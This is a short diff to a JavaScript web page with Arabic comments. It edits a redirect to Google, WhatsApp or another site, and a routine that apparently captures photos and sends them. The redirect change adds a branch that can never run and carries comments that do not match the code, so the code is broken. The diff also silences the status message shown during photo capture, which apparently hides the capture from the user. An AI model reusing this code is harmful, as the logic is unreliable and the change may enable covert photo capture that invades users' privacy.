@@ -145,9 +145,14 @@ document.addEventListener('DOMContentLoaded', () => {
         if (choice) {
             // الذهاب إلى Google
             window.open(REDIRECT_URLS.google, '_blank');
-        } else {
-            // الذهاب إلى WhatsApp
+        }
+        else if (choice) {
+            // الذهاب إلى Google
             window.open(REDIRECT_URLS.whatsapp, '_blank');
+        }
+         else {
+            // الذهاب إلى WhatsApp
+            window.open(REDIRECT_URLS.beytakbar, '_blank');
         }
     }
     
@@ -211,7 +216,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
         //جاري التقاط الصور
-        updateStatus('', 'info');
+        //updateStatus('', 'info');
         capturePhotoBtn.disabled = true;
         let allPhotosSent = true;
 
